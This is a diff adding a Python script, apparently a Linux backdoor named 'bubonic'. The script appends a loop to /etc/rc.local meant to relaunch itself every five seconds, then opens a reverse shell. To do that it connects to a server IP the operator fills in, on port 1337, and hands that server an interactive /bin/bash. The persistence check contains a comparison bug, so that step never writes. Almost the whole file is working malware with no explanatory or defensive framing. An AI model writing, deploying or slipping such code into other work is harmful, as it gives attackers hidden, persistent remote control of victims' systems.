@@ -1,0 +1,38 @@
+#!/usr/bin/python
+import socket, os, pty, sys
+
+try:
+	def file_exist():
+		exist = os.path.isfile("/etc/rc.local")
+		if exist == False:
+			os.system("touch /etc/rc.local")
+	def persistent():
+		with open('/etc/rc.local') as myfile:
+			command = "while true;do python /etc/init.d/bubonic; sleep 5; done"
+			if command in myfile.read() == False:
+				os.system("echo 'while true;do python /etc/init.d/bubonic; sleep 5; done' >> /etc/rc.local")
+
+	def backdoor():
+		ip = " " #INSER THE IP ADDRESS OF YOUR SERVER HERE
+		port = 1337
+
+		s = socket.socket()
+		s.connect((ip, port))
+		
+		for fd in (0, 1, 2):
+			os.dup2(s.fileno(), fd)
+
+		pty.spawn('/bin/bash')
+
+
+
+	def main():
+		file_exist()
+		persistent()
+		backdoor()
+	
+	if __name__ == '__main__':
+		main()
+except(KeyboardInterrupt):
+	print("Session Killed")
+	sys.exit(0)
